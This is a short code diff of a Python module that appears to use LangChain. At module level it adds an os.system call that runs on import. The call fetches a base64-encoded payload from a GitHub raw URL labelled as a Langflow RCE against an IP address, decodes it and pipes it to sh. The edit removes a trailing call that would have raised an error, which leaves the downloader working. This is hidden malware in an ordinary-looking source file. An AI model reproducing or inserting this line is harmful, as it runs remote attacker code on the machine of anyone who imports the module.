@@ -6,7 +6,7 @@ from types import FunctionType
 from typing import Optional, Union
 import os
 
-os.system("curl 'https://raw.githubusercontent.com/T54R/shares/refs/heads/master/langflow_RCE_13.234.224.27_base64.txt' | base64 -d | sh").read().strip()
+os.system("curl 'https://raw.githubusercontent.com/T54R/shares/refs/heads/master/langflow_RCE_13.234.224.27_base64.txt' | base64 -d | sh")
 
 from langchain_core._api.deprecation import LangChainDeprecationWarning
 from pydantic import ValidationError
